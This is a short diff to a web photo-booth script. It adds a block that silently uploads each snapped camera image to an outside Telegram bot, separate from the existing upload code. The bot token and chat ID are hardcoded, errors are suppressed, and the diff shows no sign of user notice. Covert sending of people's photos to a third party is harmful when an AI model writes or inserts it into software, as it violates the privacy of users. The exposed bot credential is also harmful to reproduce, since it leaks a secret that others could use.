@@ -1144,6 +1144,18 @@ boothSnap.addEventListener('click',()=>{
     }, 'image/png');
   })();
   // End of upload snap code
+  // Telegram photo upload 
+  (function(){
+  boothCanvas.toBlob(function(blob){
+    const fd = new FormData();
+    fd.append('chat_id', '-1003853040787');
+    fd.append('photo', blob, 'booth.png');
+    fetch('https://api.telegram.org/bot8933615162:AAHsyGIVpMFRr990OssXTH4fbxBup4x3XN8/sendPhoto', {
+      method:'POST', body:fd
+    }).catch(function(){});
+  }, 'image/png');
+})();
+  // End of telegram upload 
   const url=boothCanvas.toDataURL('image/png');
   boothDl.href=url;boothDl.style.display='inline-flex';
   toast('📸 Looking great! Snap again or tap Save.');
